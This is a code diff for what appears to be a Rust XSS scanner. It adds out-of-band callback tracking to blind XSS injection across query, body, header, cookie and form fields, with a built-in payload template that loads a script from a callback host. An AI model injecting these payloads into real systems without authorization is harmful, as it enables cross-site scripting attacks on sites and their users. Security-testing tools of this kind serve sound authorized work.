@@ -1,15 +1,95 @@
+use crate::oob::{InjectionRecord, OobSession};
 use crate::target_parser::Target;
 
-/// Build the blind-XSS payload(s) for a callback URL.
+/// Where a blind callback URL comes from for a given injection pass.
 ///
-/// When `custom_template_path` is provided, every non-empty,
-/// non-`#`-comment line that contains `{callback}` is treated as a
-/// template and `{callback}` is substituted with `callback_url`. Lines
-/// without `{callback}` are reported via stderr and dropped — that's
-/// the contract advertised by `--custom-blind-xss-payload`. If no
-/// usable lines exist in the file (or it can't be read), fall back to
-/// the built-in template.
-fn build_blind_payloads(callback_url: &str, custom_template_path: Option<&str>) -> Vec<String> {
+/// `Static` is the historical `-b/--blind <url>` behavior. `Oob` mints a fresh
+/// per-payload interactsh URL (recorded for later correlation). `Both` sends a
+/// payload for each — so `-b` and `--blind-oob` together fire both channels.
+#[derive(Clone, Copy)]
+pub enum CallbackSource<'a> {
+    Static(&'a str),
+    Oob(&'a OobSession),
+    Both {
+        url: &'a str,
+        session: &'a OobSession,
+    },
+}
+
+impl<'a> CallbackSource<'a> {
+    fn static_url(&self) -> Option<&'a str> {
+        match self {
+            CallbackSource::Static(u) => Some(u),
+            CallbackSource::Both { url, .. } => Some(url),
+            CallbackSource::Oob(_) => None,
+        }
+    }
+
+    fn session(&self) -> Option<&'a OobSession> {
+        match self {
+            CallbackSource::Oob(s) => Some(s),
+            CallbackSource::Both { session, .. } => Some(session),
+            CallbackSource::Static(_) => None,
+        }
+    }
+}
+
+/// Map an internal param-type tag to the wire `location` understood by
+/// `generate_poc`. Cookies fold into `Header` (a cookie side-channel POC).
+fn location_of(param_type: &str) -> &'static str {
+    match param_type {
+        "query" => "Query",
+        "body" => "Body",
+        "header" | "cookie" => "Header",
+        _ => "",
+    }
+}
+
+/// Build the concrete payload(s) to send for one (param × template) slot and,
+/// for any OOB source, mint+record a fresh callback URL keyed by its nonce so a
+/// later interaction correlates back to this exact request.
+///
+/// `record_url` is the URL stored in the correlation registry (the target URL,
+/// or a form's action URL). `location`/`method` describe the injection point.
+fn build_send_payloads(
+    source: &CallbackSource<'_>,
+    template: &str,
+    record_url: &str,
+    param: &str,
+    location: &str,
+    method: &str,
+) -> Vec<String> {
+    let mut out = Vec::with_capacity(2);
+    if let Some(url) = source.static_url() {
+        out.push(template.replace("{}", url));
+    }
+    if let Some(session) = source.session() {
+        let (url, nonce) = session.mint_url();
+        let payload = template.replace("{}", &url);
+        session.registry().record(
+            nonce,
+            InjectionRecord {
+                target_url: record_url.to_string(),
+                param: param.to_string(),
+                location: location.to_string(),
+                payload: payload.clone(),
+                method: method.to_string(),
+            },
+        );
+        out.push(payload);
+    }
+    out
+}
+
+/// Build the blind-XSS payload *templates* (callback placeholder still present,
+/// normalized to a single `{}` marker).
+///
+/// When `custom_template_path` is provided, every non-empty, non-`#`-comment
+/// line that contains `{callback}` is treated as a template. Lines without
+/// `{callback}` are reported via stderr and dropped — the contract advertised by
+/// `--custom-blind-xss-payload`. If no usable lines exist (or the file can't be
+/// read), fall back to the built-in template.
+fn build_blind_templates(custom_template_path: Option<&str>) -> Vec<String> {
     if let Some(path) = custom_template_path {
         match crate::utils::fs::read_bounded(
             std::path::Path::new(path),
@@ -17,7 +97,7 @@ fn build_blind_payloads(callback_url: &str, custom_template_path: Option<&str>) 
             "custom blind XSS template",
         ) {
             Ok(content) => {
-                let mut payloads: Vec<String> = Vec::new();
+                let mut templates: Vec<String> = Vec::new();
                 let mut bad_lines = 0u32;
                 for (lineno, line) in content.lines().enumerate() {
                     let trimmed = line.trim();
@@ -25,7 +105,7 @@ fn build_blind_payloads(callback_url: &str, custom_template_path: Option<&str>) 
                         continue;
                     }
                     if trimmed.contains("{callback}") {
-                        payloads.push(trimmed.replace("{callback}", callback_url));
+                        templates.push(trimmed.replace("{callback}", "{}"));
                     } else {
                         bad_lines += 1;
                         if bad_lines <= 3 {
@@ -36,8 +116,8 @@ fn build_blind_payloads(callback_url: &str, custom_template_path: Option<&str>) 
                         }
                     }
                 }
-                if !payloads.is_empty() {
-                    return payloads;
+                if !templates.is_empty() {
+                    return templates;
                 }
                 eprintln!(
                     "Warning: --custom-blind-xss-payload {} had no usable lines — falling back to built-in",
@@ -56,15 +136,35 @@ fn build_blind_payloads(callback_url: &str, custom_template_path: Option<&str>) 
         .first()
         .copied()
         .unwrap_or("\"'><script src={}></script>");
-    vec![template.replace("{}", callback_url)]
+    vec![template.to_string()]
 }
 
+/// Backward-compatible entry: inject a blind payload built from a single static
+/// callback URL (`-b/--blind`). Thin shim over [`blind_scanning_with`].
 pub async fn blind_scanning(
     target: &Target,
     callback_url: &str,
     custom_template_path: Option<&str>,
 ) {
-    let payloads = build_blind_payloads(callback_url, custom_template_path);
+    blind_scanning_with(
+        target,
+        CallbackSource::Static(callback_url),
+        custom_template_path,
+    )
+    .await;
+}
+
+/// Inject blind payloads into every query/body/header/cookie param. For an OOB
+/// (or `Both`) source, each (param × template) gets a fresh per-payload callback
+/// URL recorded for later correlation.
+pub async fn blind_scanning_with(
+    target: &Target,
+    source: CallbackSource<'_>,
+    custom_template_path: Option<&str>,
+) {
+    let templates = build_blind_templates(custom_template_path);
+    let method = target.parse_method().to_string();
+    let record_url = target.url.as_str();
 
     // Collect all params with static str types to avoid per-param String allocation
     let mut all_params: Vec<(String, &str)> = Vec::new();
@@ -93,12 +193,17 @@ pub async fn blind_scanning(
         all_params.push((k.clone(), "cookie"));
     }
 
-    // Send requests for each (param × payload). Custom templates
-    // typically supply just one or two shapes, so the cartesian
-    // product stays small.
+    // Send requests for each (param × template × callback channel). Custom
+    // templates typically supply just one or two shapes, so the product stays
+    // small.
     for (param_name, param_type) in &all_params {
-        for payload in &payloads {
-            send_blind_request(target, param_name, payload, param_type).await;
+        let location = location_of(param_type);
+        for template in &templates {
+            for payload in
+                build_send_payloads(&source, template, record_url, param_name, location, &method)
+            {
+                send_blind_request(target, param_name, &payload, param_type).await;
+            }
         }
     }
 }
@@ -230,22 +335,40 @@ async fn send_blind_request(target: &Target, param_name: &str, payload: &str, pa
 /// query-param blind injection in [`blind_scanning`]. Cross-origin form
 /// actions are skipped to avoid unintended outbound requests. Multipart
 /// forms are also skipped in this first pass.
+/// Backward-compatible entry: blind-scan forms with a single static callback
+/// URL (`-b/--blind`). Thin shim over [`blind_scan_forms_with`].
 pub async fn blind_scan_forms(
     target: &Target,
     callback_url: &str,
     custom_template_path: Option<&str>,
 ) {
+    blind_scan_forms_with(
+        target,
+        CallbackSource::Static(callback_url),
+        custom_template_path,
+    )
+    .await;
+}
+
+/// Discover same-origin POST forms and submit a blind payload per injectable
+/// field. For an OOB (or `Both`) source each field gets a fresh per-payload
+/// callback URL recorded for later correlation.
+pub async fn blind_scan_forms_with(
+    target: &Target,
+    source: CallbackSource<'_>,
+    custom_template_path: Option<&str>,
+) {
     use tokio::time::{Duration, sleep};
     use url::form_urlencoded;
 
-    let payloads = build_blind_payloads(callback_url, custom_template_path);
+    let templates = build_blind_templates(custom_template_path);
     // For form-discovery blast we keep the first template — the form
     // probe is best-effort and using every template here multiplies
     // request count without changing detection probability much.
-    let payload = payloads
+    let template = templates
         .first()
-        .cloned()
-        .unwrap_or_else(|| "\"'><script src=ABOUT:BLANK></script>".to_string());
+        .map(String::as_str)
+        .unwrap_or("\"'><script src={}></script>");
 
     let client = target.build_client_or_default();
     let cookie_header = build_cookie_header(&target.cookies);
@@ -340,55 +463,63 @@ pub async fn blind_scan_forms(
     };
 
     for FormInfo { action, fields } in forms {
+        let action_str = action.as_str().to_string();
         for field_idx in 0..fields.len() {
             if !fields[field_idx].injectable {
                 continue;
             }
-            let body = fields
-                .iter()
-                .enumerate()
-                .map(|(i, f)| {
-                    let value = if i == field_idx { &payload } else { &f.value };
-                    let enc_n =
-                        form_urlencoded::byte_serialize(f.name.as_bytes()).collect::<String>();
-                    let enc_v =
-                        form_urlencoded::byte_serialize(value.as_bytes()).collect::<String>();
-                    format!("{}={}", enc_n, enc_v)
-                })
-                .collect::<Vec<_>>()
-                .join("&");
+            // One payload per callback channel (Static / Oob / Both). For OOB
+            // this mints+records a fresh URL keyed to this form field.
+            let field_name = &fields[field_idx].name;
+            let payloads =
+                build_send_payloads(&source, template, &action_str, field_name, "Body", "POST");
+            for payload in &payloads {
+                let body = fields
+                    .iter()
+                    .enumerate()
+                    .map(|(i, f)| {
+                        let value = if i == field_idx { payload } else { &f.value };
+                        let enc_n =
+                            form_urlencoded::byte_serialize(f.name.as_bytes()).collect::<String>();
+                        let enc_v =
+                            form_urlencoded::byte_serialize(value.as_bytes()).collect::<String>();
+                        format!("{}={}", enc_n, enc_v)
+                    })
+                    .collect::<Vec<_>>()
+                    .join("&");
 
-            let mut request = client.post(action.clone());
-            for (k, v) in &target.headers {
-                // Skip Content-Type from caller-supplied headers so we don't
-                // emit a second value that conflicts with the urlencoded body.
-                if k.eq_ignore_ascii_case("content-type") {
-                    continue;
+                let mut request = client.post(action.clone());
+                for (k, v) in &target.headers {
+                    // Skip Content-Type from caller-supplied headers so we don't
+                    // emit a second value that conflicts with the urlencoded body.
+                    if k.eq_ignore_ascii_case("content-type") {
+                        continue;
+                    }
+                    request = request.header(k, v);
                 }
-                request = request.header(k, v);
-            }
-            // Set Content-Type last to guarantee it wins.
-            request = request.header("Content-Type", "application/x-www-form-urlencoded");
-            if let Some(ua) = &target.user_agent {
-                request = request.header("User-Agent", ua);
-            }
-            if let Some(ref h) = cookie_header {
-                request = request.header("Cookie", h);
-            }
-            request = request.body(body);
+                // Set Content-Type last to guarantee it wins.
+                request = request.header("Content-Type", "application/x-www-form-urlencoded");
+                if let Some(ua) = &target.user_agent {
+                    request = request.header("User-Agent", ua);
+                }
+                if let Some(ref h) = cookie_header {
+                    request = request.header("Cookie", h);
+                }
+                request = request.body(body);
 
-            crate::record_outbound_request().await;
-            if let Err(e) = request.send().await
-                && crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed)
-            {
-                eprintln!(
-                    "[DBG] blind form request failed action={} field_idx={}: {}",
-                    action, field_idx, e
-                );
-            }
+                crate::record_outbound_request().await;
+                if let Err(e) = request.send().await
+                    && crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed)
+                {
+                    eprintln!(
+                        "[DBG] blind form request failed action={} field_idx={}: {}",
+                        action, field_idx, e
+                    );
+                }
 
-            if target.delay > 0 {
-                sleep(Duration::from_millis(target.delay)).await;
+                if target.delay > 0 {
+                    sleep(Duration::from_millis(target.delay)).await;
+                }
             }
         }
     }
